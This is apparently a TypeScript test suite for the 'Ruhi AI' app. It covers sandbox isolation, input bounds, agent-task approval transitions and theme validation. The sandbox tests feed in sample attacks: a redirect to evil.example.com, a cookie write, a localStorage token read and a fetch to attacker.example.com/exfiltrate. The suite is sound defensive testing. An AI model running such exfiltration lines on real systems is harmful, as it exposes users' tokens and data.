import assert from 'assert';
import mongoose from 'mongoose';
import { executeSandboxedCode } from '../src/services/analysis/index';

let passedCount = 0;
let failedCount = 0;

function test(name: string, fn: () => void | Promise<void>) {
  try {
    fn();
    console.log(`  ✅ PASS: ${name}`);
    passedCount++;
  } catch (err: any) {
    console.error(`  ❌ FAIL: ${name}`);
    console.error(`     Error: ${err.message}`);
    failedCount++;
  }
}

async function asyncTest(name: string, fn: () => Promise<void>) {
  try {
    await fn();
    console.log(`  ✅ PASS: ${name}`);
    passedCount++;
  } catch (err: any) {
    console.error(`  ❌ FAIL: ${name}`);
    console.error(`     Error: ${err.message}`);
    failedCount++;
  }
}

console.log('\n🔒 =================================================================');
console.log('🔒 RUHI AI: RELIABILITY, SECURITY, SANDBOX & UX VALIDATION SUITE');
console.log('🔒 =================================================================\n');

async function runAllTests() {
  // =========================================================================
  // 1. Sandboxed Code Security & Global Shadowing
  // =========================================================================
  console.log('• 1. Sandboxed Code Security & Isolation');

  await asyncTest('Safely executes benign mathematical & string transformations', async () => {
    const code = `
      const numbers = [1, 2, 3, 4, 5];
      const sum = numbers.reduce((a, b) => a + b, 0);
      console.log('Sum:', sum);
      console.log('Done');
    `;
    const result = await executeSandboxedCode(code);
    assert.strictEqual(result.success, true);
    const logsText = result.logs.join(' ');
    assert.ok(logsText.includes('Sum: 15'));
    assert.ok(logsText.includes('Done'));
  });

  await asyncTest('Blocks window object breakout attempt', async () => {
    const code = `window.location.href = "https://evil.example.com";`;
    const result = await executeSandboxedCode(code);
    assert.strictEqual(result.success, false);
    assert.ok(result.error?.includes('Prohibited token'));
  });

  await asyncTest('Blocks document DOM access attempt', async () => {
    const code = `document.cookie = "stolen=true";`;
    const result = await executeSandboxedCode(code);
    assert.strictEqual(result.success, false);
    assert.ok(result.error?.includes('Prohibited token'));
  });

  await asyncTest('Blocks localStorage extraction attempt', async () => {
    const code = `localStorage.getItem("token");`;
    const result = await executeSandboxedCode(code);
    assert.strictEqual(result.success, false);
    assert.ok(result.error?.includes('Prohibited token'));
  });

  await asyncTest('Blocks fetch network calls attempt', async () => {
    const code = `fetch("https://attacker.example.com/exfiltrate");`;
    const result = await executeSandboxedCode(code);
    assert.strictEqual(result.success, false);
    assert.ok(result.error?.includes('Prohibited token'));
  });

  await asyncTest('Shadows dangerous globals as undefined', async () => {
    const code = `
      const checkWindow = typeof window;
      const checkDoc = typeof document;
      const checkFetch = typeof fetch;
      console.log('types:', checkWindow, checkDoc, checkFetch);
    `;
    const result = await executeSandboxedCode(code);
    assert.strictEqual(result.success, true);
    const logsText = result.logs.join(' ');
    assert.ok(logsText.includes('undefined undefined undefined'));
  });

  // =========================================================================
  // 2. Input Validation & Bounds
  // =========================================================================
  console.log('\n• 2. Input Boundary & ObjectId Validation');

  test('Validates 24-character hexadecimal ObjectId', () => {
    const validId = '507f1f77bcf86cd799439011';
    const invalidId = 'not-a-valid-hex-id-123';
    assert.strictEqual(mongoose.Types.ObjectId.isValid(validId), true);
    assert.strictEqual(mongoose.Types.ObjectId.isValid(invalidId), false);
  });

  test('Enforces Artifact content size and title bounds', () => {
    const validateArtifact = (title: string, content: string) => {
      if (!title || title.trim().length === 0 || title.length > 200) {
        return { valid: false, error: 'Invalid title' };
      }
      if (content === undefined || content === null || content.length > 500000) {
        return { valid: false, error: 'Invalid content' };
      }
      return { valid: true };
    };

    assert.strictEqual(validateArtifact('', 'hello').valid, false);
    assert.strictEqual(validateArtifact('a'.repeat(201), 'hello').valid, false);
    assert.strictEqual(validateArtifact('Valid Title', 'a'.repeat(500001)).valid, false);
    assert.strictEqual(validateArtifact('Valid Title', 'a'.repeat(100)).valid, true);
  });

  test('Enforces Chat message length bounds and attachment limits', () => {
    const validateChatMessage = (content: string, attachments?: any[]) => {
      if (!content || typeof content !== 'string' || content.trim().length === 0) {
        return { valid: false, error: 'Content required' };
      }
      if (content.length > 50000) {
        return { valid: false, error: 'Content exceeds 50k characters' };
      }
      if (attachments && attachments.length > 10) {
        return { valid: false, error: 'Too many attachments' };
      }
      return { valid: true };
    };

    assert.strictEqual(validateChatMessage('').valid, false);
    assert.strictEqual(validateChatMessage('a'.repeat(50001)).valid, false);
    assert.strictEqual(validateChatMessage('Valid prompt', new Array(11).fill({})).valid, false);
    assert.strictEqual(validateChatMessage('Valid prompt', [{}, {}]).valid, true);
  });

  test('Enforces Message Edit content and version index bounds', () => {
    const validateMessageEdit = (newContent: string, activeVersionIndex?: number) => {
      if (!newContent || typeof newContent !== 'string' || newContent.trim().length === 0) {
        return { valid: false, error: 'Invalid content' };
      }
      if (newContent.length > 50000) {
        return { valid: false, error: 'Content exceeds 50k characters' };
      }
      if (typeof activeVersionIndex === 'number' && (activeVersionIndex < 0 || activeVersionIndex > 100)) {
        return { valid: false, error: 'Invalid version index' };
      }
      return { valid: true };
    };

    assert.strictEqual(validateMessageEdit('').valid, false);
    assert.strictEqual(validateMessageEdit('hello', -1).valid, false);
    assert.strictEqual(validateMessageEdit('hello', 101).valid, false);
    assert.strictEqual(validateMessageEdit('Updated prompt', 2).valid, true);
  });

  // =========================================================================
  // 3. Document Attachment ID Normalization
  // =========================================================================
  console.log('\n• 3. Document Attachment ID Normalization');

  test('Normalizes both id and _id from document API responses', () => {
    const normalizeDocAttachment = (uploadResponse: any) => {
      return {
        id: uploadResponse.document?.id || uploadResponse.document?._id || uploadResponse.id,
        name: uploadResponse.document?.name || 'File',
        mimeType: uploadResponse.document?.mimeType || 'application/octet-stream',
      };
    };

    const resFromStandard = { document: { id: 'doc-standard-001', name: 'paper.pdf' } };
    const resFromMongo = { document: { _id: '507f1f77bcf86cd799439011', name: 'notes.txt' } };
    const resFromFlat = { id: 'doc-flat-999', name: 'data.csv' };

    assert.strictEqual(normalizeDocAttachment(resFromStandard).id, 'doc-standard-001');
    assert.strictEqual(normalizeDocAttachment(resFromMongo).id, '507f1f77bcf86cd799439011');
    assert.strictEqual(normalizeDocAttachment(resFromFlat).id, 'doc-flat-999');
  });

  // =========================================================================
  // 4. Agent Task State Lifecycle & Human-in-the-Loop Decisions
  // =========================================================================
  console.log('\n• 4. Agent Task Approval & Resumption Transitions');

  test('Handles Human Approval granting transition to running', () => {
    const task = {
      status: 'waiting_approval',
      executionHistory: [] as any[],
    };

    const applyDecision = (decision: 'approved' | 'rejected') => {
      if (decision === 'approved') {
        task.status = 'running';
        task.executionHistory.push({
          action: 'HUMAN_APPROVAL_GRANTED',
          timestamp: new Date(),
        });
      } else if (decision === 'rejected') {
        task.status = 'cancelled';
        task.executionHistory.push({
          action: 'HUMAN_APPROVAL_REJECTED',
          timestamp: new Date(),
        });
      }
    };

    applyDecision('approved');
    assert.strictEqual(task.status, 'running');
    assert.strictEqual(task.executionHistory[0].action, 'HUMAN_APPROVAL_GRANTED');
  });

  test('Handles Human Approval rejection transition to cancelled', () => {
    const task = {
      status: 'waiting_approval',
      executionHistory: [] as any[],
    };

    const applyDecision = (decision: 'approved' | 'rejected') => {
      if (decision === 'approved') {
        task.status = 'running';
        task.executionHistory.push({
          action: 'HUMAN_APPROVAL_GRANTED',
          timestamp: new Date(),
        });
      } else if (decision === 'rejected') {
        task.status = 'cancelled';
        task.executionHistory.push({
          action: 'HUMAN_APPROVAL_REJECTED',
          timestamp: new Date(),
        });
      }
    };

    applyDecision('rejected');
    assert.strictEqual(task.status, 'cancelled');
    assert.strictEqual(task.executionHistory[0].action, 'HUMAN_APPROVAL_REJECTED');
  });

  // =========================================================================
  // 5. Theme State & Accessibility Verification
  // =========================================================================
  console.log('\n• 5. Theme Preference & Accessibility Constraints');

  test('Validates theme values strictly', () => {
    const validThemes = ['light', 'dark', 'system'];
    const isThemeValid = (val: string) => validThemes.includes(val);

    assert.strictEqual(isThemeValid('light'), true);
    assert.strictEqual(isThemeValid('dark'), true);
    assert.strictEqual(isThemeValid('system'), true);
    assert.strictEqual(isThemeValid('neon-pink'), false);
    assert.strictEqual(isThemeValid(''), false);
  });

  console.log('\n-----------------------------------------------------------------');
  console.log(`Results: ${passedCount} Passed, ${failedCount} Failed`);
  console.log('-----------------------------------------------------------------\n');

  if (failedCount > 0) {
    process.exit(1);
  }
}

runAllTests().catch((err) => {
  console.error('Test runner encountered unexpected error:', err);
  process.exit(1);
});
